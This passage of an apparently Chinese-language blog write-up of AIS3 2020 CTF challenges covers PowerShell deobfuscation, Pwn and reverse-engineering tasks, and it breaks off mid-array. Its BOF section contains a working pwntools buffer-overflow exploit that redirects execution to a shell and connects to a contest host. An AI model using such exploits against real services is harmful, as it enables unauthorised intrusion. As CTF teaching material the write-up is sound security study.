<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'&amp;$ !# $# @% { %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## !# &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $% ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @@ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;# &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# %&amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ }'</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!!'</span><span class="p">,</span><span class="s1">'V'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!@'</span><span class="p">,</span><span class="s1">'5'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!#'</span><span class="p">,</span><span class="s1">'I'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!$'</span><span class="p">,</span><span class="s1">'K'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!%'</span><span class="p">,</span><span class="s1">'E'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!&amp;'</span><span class="p">,</span><span class="s1">'U'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@!'</span><span class="p">,</span><span class="s1">'F'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@@'</span><span class="p">,</span><span class="s1">'0'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@#'</span><span class="p">,</span><span class="s1">'W'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@$'</span><span class="p">,</span><span class="s1">'G'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@%'</span><span class="p">,</span><span class="s1">'3'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@&amp;'</span><span class="p">,</span><span class="s1">'Z'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'#!'</span><span class="p">,</span><span class="s1">'Y'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'#@'</span><span class="p">,</span><span class="s1">'M'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'##'</span><span class="p">,</span><span class="s1">'H'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'#$'</span><span class="p">,</span><span class="s1">'B'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'#%'</span><span class="p">,</span><span class="s1">'C'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'#&amp;'</span><span class="p">,</span><span class="s1">'8'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'$!'</span><span class="p">,</span><span class="s1">'J'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'$@'</span><span class="p">,</span><span class="s1">'2'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'$#'</span><span class="p">,</span><span class="s1">'S'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'$$'</span><span class="p">,</span><span class="s1">'X'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'$%'</span><span class="p">,</span><span class="s1">'7'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'$&amp;'</span><span class="p">,</span><span class="s1">'R'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'%!'</span><span class="p">,</span><span class="s1">'6'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'%@'</span><span class="p">,</span><span class="s1">'9'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'%#'</span><span class="p">,</span><span class="s1">'4'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'%$'</span><span class="p">,</span><span class="s1">'T'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'%%'</span><span class="p">,</span><span class="s1">'P'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'%&amp;'</span><span class="p">,</span><span class="s1">'D'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&amp;!'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&amp;@'</span><span class="p">,</span><span class="s1">'L'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&amp;#'</span><span class="p">,</span><span class="s1">'Q'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&amp;$'</span><span class="p">,</span><span class="s1">'A'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&amp;%'</span><span class="p">,</span><span class="s1">'N'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&amp;&amp;'</span><span class="p">,</span><span class="s1">'O'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span><span class="s1">''</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>Flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}
</code></pre></div></div>

<h2 id="pwn">Pwn</h2>

<p>很可惜，過了一年我 Pwn 還是只會簽到題，所以只能解出 BOF。</p>

<h3 id="-bof-100-pt">👻 BOF (100 pt.)</h3>

<p>去年我是依普通起手式 <code class="language-plaintext highlighter-rouge">objdump</code> 找到 <code class="language-plaintext highlighter-rouge">system('sh')</code> 的位址來寫的。今年我的想法是試試看透過 radare2 來找位址。因此首先第一件事就是 <code class="language-plaintext highlighter-rouge">aa</code> 然後 <code class="language-plaintext highlighter-rouge">pdf</code> 看所有 function 的位址。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/STZEATh.jpg" alt="" /></p>

<p>可是不論怎麼翻都找不到 system call，雖然 <code class="language-plaintext highlighter-rouge">0x00400570</code> 的部分有提到 <code class="language-plaintext highlighter-rouge">system</code>，但很明顯只是 reference system call 而已，所以我最後還是乖乖的用 Ghidra 來找找 <code class="language-plaintext highlighter-rouge">system</code> 這東西是被哪個 function 位址用的。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/owIoO53.png" alt="" /></p>

<p>我們發現 <code class="language-plaintext highlighter-rouge">0x00400687</code> 的地方有呼叫 <code class="language-plaintext highlighter-rouge">CALL system</code> 的 function，然後 <code class="language-plaintext highlighter-rouge">main</code> 底下的 <code class="language-plaintext highlighter-rouge">gets</code> 所 allocate 的記憶體是 0x30。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/G8pqQRL.png" alt="" /></p>

<p>所以我們就可以開始寫 pwntools 的 Python 腳本啦！</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pwn</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">'linux'</span><span class="p">)</span>
<span class="n">remote_address</span> <span class="o">=</span> <span class="s">'60.250.197.227'</span>
<span class="n">remote_port</span> <span class="o">=</span> <span class="mi">10000</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">remote_address</span><span class="p">:</span>
    <span class="n">process</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">'./bof-767fdf896cf9838c0294db24eaa1271ebf15a6e638a873e94ab9682ef28464b4'</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">process</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">remote_address</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x30</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x00400687</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">process</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">process</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">process</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'whoami'</span><span class="p">)</span>
    <span class="n">process</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Failed to pwn the remote machine."</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/images/posts/ais3-2020-writeup/2lIGWqi.jpg" alt="" /></p>

<p>Flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}
</code></pre></div></div>

<h2 id="reverse">Reverse</h2>

<h3 id="-tsaibro-100-pt">🍍 TsaiBro (100 pt.)</h3>

<p><img src="https://cdn.discordapp.com/attachments/440255677701685283/718451798981214288/ezgif-6-434c4d3244b1.gif" alt="" /></p>

<p>看起來也是去年題目。執行時，程式會要求要配上一個 string，然後會噴出這東西需要什麼字串來對應你輸入的東西。</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./TsaiBro
./TsaiBro string%

❯ ./TsaiBro a
Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...
發財...發財.% 
</code></pre></div></div>

<p>而根據 <code class="language-plaintext highlighter-rouge">TsaiBroSaid</code> 裡面的字串，我們必須得透過上面的方法重組出我們的 Flag。這時候我們就可以用很暴力的方式用 pwntools 幫我們戳每個 printable ASCII 的對應字串。不過因為每組字串都是兩個<code class="language-plaintext highlighter-rouge">發財</code>組在一起的，所以我用 RegEx 把它們一組一組拆開。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pwn</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s">"發財..發財.......發財....發財.......發財....發財.發財........發財.......發財.發財......發財..發財.....發財........發財.......發財......發財.......發財.發財........發財..發財.....發財..發財....發財.....發財.....發財.發財........發財......發財....發財........發財........發財.....發財......發財......發財.發財.發財........發財......發財.......發財........發財........發財.....發財.......發財.發財........發財.發財...發財......發財....發財........發財.....發財......發財.......發財.發財........發財...發財...發財......發財....發財........發財........發財.......發財....發財.......發財....發財........發財.......發財...發財......發財......發財...發財........發財.......發財.發財........發財...發財..發財......發財.發財......發財..發財..發財....發財......發財......發財........發財.......發財.發財........發財...發財..發財.....發財.....發財.發財...發財.發財........發財.......發財.發財......發財........發財......發財.......發財.發財........發財...發財.....發財..發財....發財......發財......發財........發財.......發財.發財........發財.......發財....發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財......發財......發財...發財.發財........發財.發財...發財......發財....發財........發財.....發財......發財.......發財.發財........發財......發財........發財........發財.....發財...發財.....發財........發財.......發財.發財......."</span>

<span class="n">flag_segments</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"發財\.{1,99}發財\.{1,99}"</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>

<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">:</span>
    <span class="n">process</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">([</span><span class="s">"./TsaiBro"</span><span class="p">,</span> <span class="n">c</span><span class="p">])</span>
    <span class="n">process</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">secret_chr</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">secret_chr</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">flag_segments</span><span class="p">)):</span>
            <span class="k">if</span> <span class="n">flag_segments</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">secret_chr</span><span class="p">:</span>
                <span class="n">flag_segments</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span>
    <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag_segments</span><span class="p">))</span>
</code></pre></div></div>

<p>Flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}
</code></pre></div></div>

<h3 id="-fallen-beat-144-pt">🎹 Fallen Beat (144 pt.)</h3>

<p>這題我看到是 Java 檔就知道是要 Decompile 回 Java 然後再翻的，所以第一件事當然就是 <code class="language-plaintext highlighter-rouge">jd</code> 一下囉。</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>18:08:22.060 INFO  com.github.kwart.jd.cli.Main - Decompiling .<span class="se">\F</span>allen_Beat.jar
18:08:22.065 INFO  com.github.kwart.jd.output.ZipOutput - ZIP file output will be initialized - Fallen_Beat.src.jar
18:08:22.527 INFO  com.github.kwart.jd.output.ZipOutput - Finished with 15 class file<span class="o">(</span>s<span class="o">)</span> and 1 resource file<span class="o">(</span>s<span class="o">)</span> written.
</code></pre></div></div>

<p>接著就是把 IDEA 翻出來然後慢慢看檔案。一開始看到的 Code 其實還滿亂的，不過我們可以想想遊戲控制的東西大概都會塞在哪。</p>

<p>解題方向：</p>

<ul>
  <li>提示跟我們說要把所有 Combo 按出來，那遊戲怎麼取得最高 Combo 是多少？
    <ul>
      <li>方法一: 把 Max Combo 換成容許的最高值</li>
    </ul>
  </li>
  <li>在 <code class="language-plaintext highlighter-rouge">PanelEnding</code> 裡面，我們有找到取 Flag 的一段
    <ul>
      <li>我們如果知道 Cache 是什麼的話就可以直接把 Flag 從 byte[] 噴出來</li>
      <li>我們既然有 Debugger 跟 Code 了，那我們直接讓那個 <code class="language-plaintext highlighter-rouge">if</code> 噴 <code class="language-plaintext highlighter-rouge">true</code> 就好啦</li>
      <li>方法二：直接跳過 <code class="language-plaintext highlighter-rouge">if (t == mc)</code></li>
    </ul>
  </li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">(</span><span class="n">t</span> <span class="o">==</span> <span class="n">mc</span><span class="o">)</span> <span class="o">{</span>
  <span class="k">for</span> <span class="o">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cache</span><span class="o">.</span><span class="na">size</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span>
    <span class="k">this</span><span class="o">.</span><span class="na">flag</span><span class="o">[</span><span class="n">i</span> <span class="o">%</span> <span class="k">this</span><span class="o">.</span><span class="na">flag</span><span class="o">.</span><span class="na">length</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)(</span><span class="k">this</span><span class="o">.</span><span class="na">flag</span><span class="o">[</span><span class="n">i</span> <span class="o">%</span> <span class="k">this</span><span class="o">.</span><span class="na">flag</span><span class="o">.</span><span class="na">length</span><span class="o">]</span> <span class="o">^</span> <span class="o">((</span><span class="nc">Integer</span><span class="o">)</span><span class="n">cache</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">i</span><span class="o">)).</span><span class="na">intValue</span><span class="o">());</span> 
  <span class="nc">String</span> <span class="n">fff</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">flag</span><span class="o">);</span>
  <span class="k">this</span><span class="o">.</span><span class="na">text</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="na">setText</span><span class="o">(</span><span class="nc">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"Flag: %s"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]</span> <span class="o">{</span> <span class="n">fff</span> <span class="o">}));</span>
<span class="o">}</span>
</code></pre></div></div>

<p>音樂部分</p>

<ul>
  <li>每次都得等音樂跑完，那我們把等音樂那幾行去掉就不用等啦
    <ul>
      <li><img src="/assets/images/posts/ais3-2020-writeup/5QV9hFp.png" alt="" /></li>
    </ul>
  </li>
</ul>

<p>遊戲一開始馬上就能噴 Flag 了。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/FZTp8ZV.png" alt="" /></p>

<h3 id="-la-vie-en-rose-499-pt">🌹 La vie en rose (499 pt.)</h3>

<p>這是我這次 AIS3 花最久的一題，也是我覺得最嘔的一題，因為我摸出來之後看不出怎麼解好一段時間，而且是用最暴力的方式解。</p>

<p>首先，我們一看就知道本題所附的 exe 檔是某種 Python 編譯而成的檔案。怎麼看得？我們首先可以看它的 icon，很明顯就是 Python 的 Logo 衍生出來的。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/ZJ2Proq.png" alt="" /></p>

<p>如果這樣還不夠的話，我們可以從這東西執行時的 memory references 來看這東西目前有開哪些 handles。在這些 handles 裡面，屢次提到 <code class="language-plaintext highlighter-rouge">python38.dll</code>，所以很明顯有用到 Python 3.8 的 runtime。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/2ef1IqO.png" alt="" /></p>

<p>那我們在知道這點後就可以開始找找解包的腳本/程式，而有寫 Python 腳本有想過打包的人都知道 PyInstaller 可以做到這回事，所以找一下相關關鍵字就可以找到反打包的東西。我個人是使用 <a href="https://github.com/extremecoders-re/pyinstxtractor/">pyinstxtractor</a> 將相關檔案拉出來。</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ py <span class="nt">-3</span> .<span class="se">\p</span>yinstxtractor.py La_vie_en_rose.exe
<span class="o">[</span>+] Processing La_vie_en_rose.exe
<span class="o">[</span>+] Pyinstaller version: 2.1+
<span class="o">[</span>+] Python version: 38
<span class="o">[</span>+] Length of package: 9518557 bytes
<span class="o">[</span>+] Found 955 files <span class="k">in </span>CArchive
<span class="o">[</span>+] Beginning extraction...please standby
<span class="o">[</span>+] Possible entry point: pyiboot01_bootstrap.pyc
<span class="o">[</span>+] Possible entry point: pyi_rth__tkinter.pyc
<span class="o">[</span>+] Possible entry point: pyi_rth_multiprocessing.pyc
<span class="o">[</span>+] Possible entry point: rose.pyc
<span class="o">[</span>+] Found 258 files <span class="k">in </span>PYZ archive
<span class="o">[</span>+] Successfully extracted pyinstaller archive: La_vie_en_rose.exe
</code></pre></div></div>

<p>這時候就可以找到我們最主要想攻擊的 <code class="language-plaintext highlighter-rouge">rose.pyc</code>。
<img src="/assets/images/posts/ais3-2020-writeup/ul6QnAx.png" alt="" /></p>

<p>問題來了－<code class="language-plaintext highlighter-rouge">pyc</code> 基本上是 Python 都已經編譯成 bytecode 了，然後我不論試 <code class="language-plaintext highlighter-rouge">uncompyle6</code>, <code class="language-plaintext highlighter-rouge">decompyle3</code>, <code class="language-plaintext highlighter-rouge">pycdc</code> 都無法推回到原來的 Python 檔。我相信原作者的用意是要我們去修 <code class="language-plaintext highlighter-rouge">rose.pyc</code> 的 byte 把有問題的修正回正確的。</p>

<p>但我當時怎麼試都沒辦法，所以我決定做了件很蠢的事－重頭依 <code class="language-plaintext highlighter-rouge">pycdas</code> 所建立出來的 Python disassembly bytecode 推回去 Python 檔。這個部分起碼花了我好幾個小時，一直試 Code 然後呼叫 python <code class="language-plaintext highlighter-rouge">dis</code> 比較 bytecode還有翻<a href="https://docs.python.org/3/library/dis.html">官方 bytecode 技術文件</a>。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/i48c924.png" alt="" /></p>

<p><img src="/assets/images/posts/ais3-2020-writeup/OjlxVSg.png" alt="" /></p>

<p>於是乎，我最後推出了最關鍵的幾行 code：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">dis</span>
<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span><span class="p">,</span> <span class="n">product</span>

<span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
    <span class="n">chars</span> <span class="o">=</span> <span class="p">(</span><span class="s">'a'</span><span class="p">,</span><span class="s">'w'</span><span class="p">,</span> <span class="s">'s'</span><span class="p">,</span> <span class="s">'e'</span><span class="p">,</span> <span class="s">'d'</span><span class="p">,</span> <span class="s">'f'</span><span class="p">,</span> <span class="s">'t'</span><span class="p">,</span> <span class="s">'g'</span><span class="p">,</span> <span class="s">'y'</span><span class="p">,</span> <span class="s">'h'</span><span class="p">,</span> <span class="s">'u'</span><span class="p">,</span><span class="s">'j'</span><span class="p">,</span> <span class="s">'k'</span><span class="p">,</span> <span class="s">'o'</span><span class="p">,</span> <span class="s">'l'</span><span class="p">,</span> <span class="s">'p'</span><span class="p">,</span> <span class="s">';'</span><span class="p">,</span> <span class="s">"'"</span><span class="p">,</span> <span class="s">'['</span><span class="p">,</span> <span class="s">']'</span><span class="p">,</span> <span class="s">' '</span><span class="p">)</span>
    <span class="n">constraints</span> <span class="o">=</span> <span class="p">[</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">202</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">202</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">202</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">217</span><span class="p">,</span><span class="mi">212</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">212</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">136</span><span class="p">,</span><span class="mi">140</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">202</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">217</span><span class="p">,</span><span class="mi">217</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">182</span><span class="p">,</span><span class="mi">199</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">212</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">149</span><span class="p">,</span><span class="mi">149</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">217</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">150</span><span class="p">,</span><span class="mi">182</span><span class="p">,</span><span class="mi">199</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">219</span><span class="p">,</span><span class="mi">216</span><span class="p">,</span><span class="mi">211</span><span class="p">,</span><span class="mi">206</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span 